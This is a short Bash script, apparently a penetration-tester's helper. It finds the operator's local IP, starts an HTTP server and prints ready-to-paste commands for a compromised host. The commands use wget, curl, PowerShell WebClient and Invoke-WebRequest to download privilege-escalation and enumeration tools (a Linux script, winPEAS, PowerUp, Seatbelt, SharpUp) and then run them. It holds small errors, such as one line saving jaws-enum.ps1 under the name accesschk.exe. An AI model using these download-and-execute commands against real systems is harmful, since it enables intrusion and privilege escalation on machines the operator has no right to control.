#!/usr/bin/bash

lhost=$(ifconfig | grep "inet 172." | cut -d " " -f10)
echo "Local IP is $lhost"

echo "########################"
echo "Download Privesc Script"
echo "########################"
echo "wget http://"$lhost":80/linux/script/script_linux.sh"
echo "wget http://"$lhost":80/IPAddr/File"
echo "chmod 700 script_linux.sh"
echo "./script_linux.sh"

echo "curl -OL http://"$lhost":80/linux/script/script_linux.sh"
echo "curl -OL http://"$lhost":80/IPAddr/File"
echo "chmod 700 script_linux.sh"
echo "./script_linux.sh"

cd /var/www/html/
python3 -m http.server 80


echo ""
echo "########################"
str1='powershell.exe -c "(new-object System.Net.WebClient).DownloadFile('
str2="'http://"$lhost":80/script/accesschk.exe','C:\Users\Public\accesschk.exe')"
str3='"'
echo $str1$str2$str3
str2="'http://"$lhost":80/script/jaws-enum.ps1','C:\Users\Public\jaws-enum.ps1')"
echo $str1$str2$str3
str2="'http://"$lhost":80/script/PowerUp.ps1','C:\Users\Public\PowerUp.ps1')"
echo $str1$str2$str3
str2="'http://"$lhost":80/script/Seatbelt.exe','C:\Users\Public\Seatbelt.exe')"
echo $str1$str2$str3
str2="'http://"$lhost":80/script/SharpUp.exe','C:\Users\Public\SharpUp.exe')"
echo $str1$str2$str3
str2="'http://"$lhost":80/script/winPEAS.bat','C:\Users\Public\winPEAS.bat')"
echo $str1$str2$str3
str2="'http://"$lhost":80/script/winPEASany.exe','C:\Users\Public\winPEASany.exe')"
echo $str1$str2$str3
str2="'http://"$lhost":80/script/winPEASx64.exe','C:\Users\Public\winPEASx64.exe')"
echo $str1$str2$str3
str2="'http://"$lhost":80/script/winPEASx86.exe','C:\Users\Public\winPEASx86.exe')"
echo $str1$str2$str3
echo "########################"
str1='Invoke-WebRequest -Uri "'
str2='http://'$lhost':80/script/jaws-enum.ps1" -OutFile "C:\Users\Public\jaws-enum.ps1"'
echo $str1$str2
str2='http://'$lhost':80/script/jaws-enum.ps1" -OutFile "C:\Users\Public\accesschk.exe"'
echo $str1$str2
str2='http://'$lhost':80/script/PowerUp.ps1" -OutFile "C:\Users\Public\PowerUp.ps1"'
echo $str1$str2
str2='http://'$lhost':80/script/Seatbelt.exe" -OutFile "C:\Users\Public\Seatbelt.exe"'
echo $str1$str2
str2='http://'$lhost':80/script/SharpUp.exe" -OutFile "C:\Users\Public\SharpUp.exe"'
echo $str1$str2
str2='http://'$lhost':80/script/winPEAS.bat" -OutFile "C:\Users\Public\winPEAS.bat"'
echo $str1$str2
str2='http://'$lhost':80/script/winPEASany.exe" -OutFile "C:\Users\Public\winPEASany.exe"'
echo $str1$str2
str2='http://'$lhost':80/script/winPEASx64.exe" -OutFile "C:\Users\Public\winPEASx64.exe"'
echo $str1$str2
str2='http://'$lhost':80/script/winPEASx86.exe" -OutFile "C:\Users\Public\winPEASx86.exe"'
echo $str1$str2
echo "########################"
echo "start-process 'cmd.exe' '/c C:\Users\Public\winPEASany.exe > winPEASany.txt'"
echo "start-process 'cmd.exe' '/c C:\Users\Public\winPEASx64.exe > winPEASx64.txt'"
echo "start-process 'cmd.exe' '/c C:\Users\Public\winPEASx86.exe > winPEASx86.txt'"
echo "start-process 'cmd.exe' '/c C:\Users\Public\winPEAS.bat > winPEASbat.txt'"
echo "########################"



